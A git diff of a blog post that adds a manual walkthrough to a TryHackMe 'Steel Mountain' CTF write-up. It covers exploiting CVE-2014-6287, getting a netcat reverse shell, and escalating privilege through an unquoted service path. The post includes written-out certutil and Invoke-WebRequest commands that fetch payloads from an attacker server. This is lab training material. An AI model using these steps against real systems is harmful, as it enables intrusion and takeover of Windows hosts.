@@ -1,7 +1,7 @@
 ---
-title: Tryhackme Steel Mountaing CTF Writeup
+title: Tryhackme Steel Mountain CTF Writeup
 author: krygennn
-date: 2021-10-9 00:59
+date: 2021-12-23 00:50
 categories: [Blogging,cyber-security,tryhackme]
 image:
     src: /assets/img/posts/tryhackme-steel-mountain-ctf-writeup/1.jpg
@@ -75,6 +75,7 @@ After gaining access to the system as a low-level user, it is time to get admini
 permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
 any misconfigurations and privilege escalation possibilities.
 <br>-> [**Download PowerUp.ps1**](../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
+<br>-> [**PowerSploit GitHub Repo**](https://github.com/PowerShellMafia/PowerSploit)
 <br>-> Run `exit` and get back to the **meterpreter** session.
 <br>-> Upload the script just as we did before to the machine.
 <br>-> Run `load powershell`
@@ -85,7 +86,7 @@ any misconfigurations and privilege escalation possibilities.
 <br>-> Run `Invoke-AllChecks`
 <br>**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
 <br><br>The first result we got is a service called **AdvancedSystemCare9**, and it has a vulnerability called 
-**Unquoted Service Path** [**-> Read more about it**](). We will abuse this vulnerability. 
+**Unquoted Service Path** [**-> Read more about it**](https://krygennn.github.io/posts/unquoted-service-path-vulnerability/). We will abuse this vulnerability. 
 <br>**CanRestart** field means that the current user, in this case, **bill**, can manually restart the service even though
 the service itself is being run with **LocalSystem** service account permissions, which has the top-level privileges.
 <br>[**LocalSystem Service Account**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN)
@@ -129,4 +130,34 @@ You can find the root flag **root.txt** under **C:\Users\Administrator\Desktop**
 # SECOND METHOD
 
 In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.
-<br> To be continued ...
+
+## 1-Preperation
+<br>-> Copy **Advanced.exe** or create a new backdoor executable with **msfvenom** just like before.
+<br>-> Download [**winPEAS.bat**](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat)
+<br>-> Download static binary [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe)
+<br>-> Download [**PowerUp.ps1**](../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1) or use the previous one if you downloaded it before.
+<br>-> Download [**CVE-2014-6287.py**](../../assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py) or from [**Exploitdb**](https://www.exploit-db.com/exploits/39161)
+<br><br>Your directory should look like this
+<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg){:.normal}<br><br>
+## 2-Exploitation
+Edit the **cve20146287.py** file, set the `ip_addr` field to your THM IP, and set the `local_port` to any free port.
+<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg){:.normal}<br><br>
+
+Start a **netcat** listener on the port you declared in the **python** file.
+<br>Run it twice. At first run the server will download **nc.exe** static binary from your server. At second, it will run
+**nc.exe** to connect to your local machine by providing a CMD prompt.
+<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg){:.normal}<br><br>
+
+<br>It is possible to use PowerUp.ps1 again or **winPEAS.bat** can be used to enumerate misconfigurations.
+<br>You can download any file from the running python server by using one of these utilites.
+<br>-> `powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"`
+<br>-> `certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}`
+<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg){:.normal}<br><br>
+As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on **Advanced System Care9**
+service and many others.
+<br>![](/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg){:.normal}<br><br>
+You will need to repeat previous steps to get the root flag. Download **Advanced.exe** with <br>**Invoke-WebRequest** or
+**certutil**, start a Netcat listener and restart the service.
+<br>
+<br>
+Thank you for following, wish you more penetrations ;)
